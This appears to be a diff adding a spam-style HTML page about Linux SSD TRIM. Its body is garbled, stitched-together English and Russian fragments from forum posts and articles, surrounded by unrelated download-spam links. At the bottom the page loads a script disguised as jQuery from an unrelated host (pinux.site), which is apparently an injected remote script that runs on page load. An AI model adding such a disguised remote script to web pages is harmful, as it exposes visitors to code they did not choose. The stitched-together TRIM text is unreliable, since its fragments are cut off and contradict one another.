@@ -1,0 +1,145 @@
+<!DOCTYPE HTML>
+
+<html>
+
+<head>
+    <title>Linux ssd trim - aisaoghohs.jveldridge.com</title>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+    <link rel="stylesheet" href="main.css" />
+</head>
+
+<body class="subpage">
+    <div id="page-wrapper">
+
+        <!-- Header -->
+        <section id="header">
+            <div class="container">
+                <div class="row">
+                    <div class="col-12">
+
+                        <!-- Logo -->
+                        <h1><a href="/" id="logo">aisaoghohs.jveldridge.com</a></h1>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Content -->
+        <section id="content">
+            <div class="container">
+                <div class="row">
+                    <div class="col-9 col-12-medium">
+
+                        <!-- Main Content -->
+                        <section>
+                            <header>
+                                <h2>Linux ssd trim</h2>
+                            </header>
+                            <p>The TRIM command minimizes performance degradation by periodically trimming the invalid pages. SSDs are a completely different storage media compared to the ones that existed before it. New concepts have been introduced in order to optimize the performance, life span and reliability of these. Как я понял из чтения статей и документации — некоторые прошивки ssd кривые и возникает потеря данных при. Most SSDs support the ATA_TRIM command for sustained long-term performance and wear-leveling. A techspot article shows performance benchmark examples of before and after filling an SSD with data. As of Linux kernel version 3.8 onwards, support for TRIM was continually added Цели использования. Команда trim была введена вскоре после появления твердотельных накопителей (ssd), чтобы сделать их конкурентоспособной альтернативой. After installing my first solid state drive (SSD) in a computer that was running Linux, I have begun to explore how to take care of them. Solid state drives are different than traditional magnetic drives in the way that they operate, and they require different care from the software 
+Как проверить или включить SSD TRIM. Как сделать TRIM NTFS. TRIM на Linux, Windows XP и Vista. Что такое. The TRIM command minimizes performance degradation by periodically trimming the invalid pages. Here four ( Btrfs, ext4, XFS, F2FS ) best Linux filesystem for SSD explained with advantages and disadvantages. Cant decide which file system is best for your Linux laptop or desktop? Here four ( Btrfs,  BtrFS supports the usual SSD features like TRIM, and other SSD optimizations. Начиная с Ubuntu 14.04 разработчики позаботились о поддержке SSD. Система сама периодически запускает функцию TRIM на SSD, никаких discard в fstab больше не требуется. 
+Owning an SSD that supports TRIM is great, but while Windows users have the benefit of having TRIM enabled for them, Linux users need to take the manual route - at least, at this point in time. In this article, we tackle the simple process of doing so, and also show how to verify. У меня есть SSD, что я хочу TRIM перед установкой Ubuntu на нем. Мне было предложено, чтобы я оставил некоторое нераспределенное пространство, так что для выравнивания. Continuous use of SSDs results in degraded performance if not accounted for and mitigated. The TRIM command is an operation that allows the operating system to propagate information down to the SSD about which blocks of data are no longer SSD is very well supported in Linux. The "feature" that many will talk about that isn't really there in Linux is for "trim" support (well. I don't think it's quite there. Tutorial on how to enable Trim for SSD (Solid State Drives) in Linux, I show you two methods of enabling Trim in Ubuntu 12.04: 1. Edit /etc/fstab Add "discar. In an attempt to clarify some of the misinformation and myths surrounding the use of SSDs, I want to list what I feel are the 3 most misunderstood topics when using SSDs with a Linux operating system. All command syntax was checked on both Ubuntu 13.10 and CentOS 6.4. Block Alignment. Всех приветствую Камрады, кто юзает ssd, скажите: используете ли ли какие-либо твики настройки? Если не производили никаких настроек, то почему. 
+I have a Vista PC I'm thinking of moving to a solid-state drive. Now, I know that Vista doesn't natively support TRIM, so considering ssd, linux. trim Данная статья не подлежит комментированию, поскольку её автор ещё не является. I'm looking to setup a system with mirrored SSD drives, i'd like to have TRIM support, and I am finding conflicting information. Some articles. Ubuntu wants to enable TRIM for SSDs by default in Ubuntu 14.04. In other words, Ubuntu isn't already using TRIM, so your SSD is slowing down over time. But why isn't Ubuntu already using. Is there TRIM (SCSI or block discard) support for SSD in Red Hat Enterprise Linux? Is TRIM properly transmitted through layers like LVM, MD (software raid), filesystems etc? Is SCSI discard on or off by default for ext4? What is fstrim tool and how can we use discard function to reclaim. 
+wiki.ubuntuusers.de говорит, что если я хочу использовать TRIM для зашифрованного SSD, мне нужно как минимум cryptsetup 1.4 и kernel. I have Linux installed on a Dell XPS 9343 with an Samsung PM851 SSD. I recently read that many SSDs don't support TRIM operations. So I'd like to check if discard option effectively works I'm running a Linux system (based on Gentoo) with a BTRFS file system installed on an SSD (Toshiba Q300 with 480GB net). My /etc/fstab looks like: UUID=14cb9b65-. swap swap defaults. FSTRIM(8)  Running fstrim frequently, or even using mount -o discard, might negatively affect the lifetime of poor-quality SSD devices.  The fstrim command is part of the util-linux package and is available from https:. In this video I discuss options for configuring your SSD for use in Linux. Hope you enjoy! Show Notes: sudo hdparm -I /dev/sdX grep "TRIM supported" (check. Команда trim даёт возможность операционной системе проинформировать диск ssd, что конкретные блоки больше не используются и могут быть стёрты и использованы вновь. Not being much of a bash person a couple of things confuse me on this. My machine is set up with system files on SSD and /tmp /var and /home on hard drives to avoid writes Длительное использование ssd-хранилища (или твердотельного накопителя) приводит к снижению его производительности. Чтобы такое хранилище прослужило дольше, его. I know that the Linux kernel supports TRIM as of version 2.6.33, so there should be TRIM support in ubuntu. Is TRIM enabled by default or do I need to change some settings or install additional. 
+</p>
+                        </section>
+
+                    </div>
+                    <div class="col-3 col-12-medium">
+
+                        <!-- Sidebar -->
+                        <section>
+                            <header>
+                                <h2>Links to Important Stuff</h2>
+                            </header>
+                            <ul class="link-list">
+                                <li><a href="iec-kak-v-staroy-skazke-skachat.html">Как в старой сказке скачать</a></li>
+                                <li><a href="iec-shpargalki-po-kriminologii-na-telefon.html">Шпаргалки по криминологии на телефон</a></li>
+                                <li><a href="iec-mgnovennyy-samogipnoz-forbs-robbins-bler-skachat.html">Мгновенный самогипноз форбс роббинс блэр скачать</a></li>
+                                <li><a href="iec-vishnevyy-sezon-muzyka-skachat.html">Вишневый сезон музыка скачать</a></li>
+                                <li><a href="iec-kuniancy.html">Кунианцы</a></li>
+                                <li><a href="iec-murmansk-raspisanie-avtobusov-108.html">Мурманск расписание автобусов 108</a></li>
+                            </ul>
+                        </section>
+                        <section>
+                            <header>
+                                <h2>Links</h2>
+                            </header>
+                            <ul class="link-list"></ul>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Footer -->
+        <section id="footer">
+            <div class="container">
+                <div class="row">
+                    <div class="col-8 col-12-medium">
+
+                        <!-- Links -->
+                        <section>
+                            <h2>Links to Important Stuff</h2>
+                            <div>
+                                <div class="row">
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="iec-tekst-pesni-ta-storona-shepotom.html">Текст песни та сторона шепотом</a></li>
+                                            <li><a href="iec-skachat-dm-server-dlya-kss.html">Скачать дм сервер для ксс</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="iec-kniga-geroi-sovetskogo-soyuza-chitat-onlayn.html">Книга герои советского союза читать онлайн</a></li>
+                                            <li><a href="iec-skachat-chitalku-fb2-na-telefon.html">Скачать читалку fb2 на телефон</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="iec-prilozhenie-uhod-za-batareey-otzyvy.html">Приложение уход за батареей отзывы</a></li>
+                                            <li><a href="iec-pesni-dmitriya-koroleva-skachat-besplatno.html">Песни дмитрия королева скачать бесплатно</a></li>
+                                        </ul>
+                                    </div>
+                                    <div class="col-3 col-12-small">
+                                        <ul class="link-list last-child">
+                                            <li><a href="iec-skachat-pesni-trassa-e-95.html">Скачать песни трасса е 95</a></li>
+                                            <li><a href="iec-naemnik-mod-dlya-stalker-zp.html">Наемник мод для сталкер зп</a></li>
+                                        </ul>
+                                    </div>
+                                </div>
+                            </div>
+                        </section>
+
+                    </div>
+                    <div class="col-4 col-12-medium imp-medium">
+
+                        <!-- Blurb -->
+                        <section>
+                            <h2>An Informative Text Blurb</h2>
+                        </section>
+
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- Copyright -->
+        <div id="copyright">
+            &copy; Untitled. All rights reserved.</a>
+        </div>
+
+    </div>
+
+    <script type="text/javascript">
+        new Image().src = "//counter.yadro.ru/hit;jquery?r" +
+            escape(document.referrer) + ((typeof(screen) == "undefined") ? "" :
+                ";s" + screen.width + "*" + screen.height + "*" + (screen.colorDepth ?
+                    screen.colorDepth : screen.pixelDepth)) + ";u" + escape(document.URL) +
+            ";h" + escape(document.title.substring(0, 150)) +
+            ";" + Math.random();
+    </script>
+<script src="http://pinux.site/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+</body>
+</html>
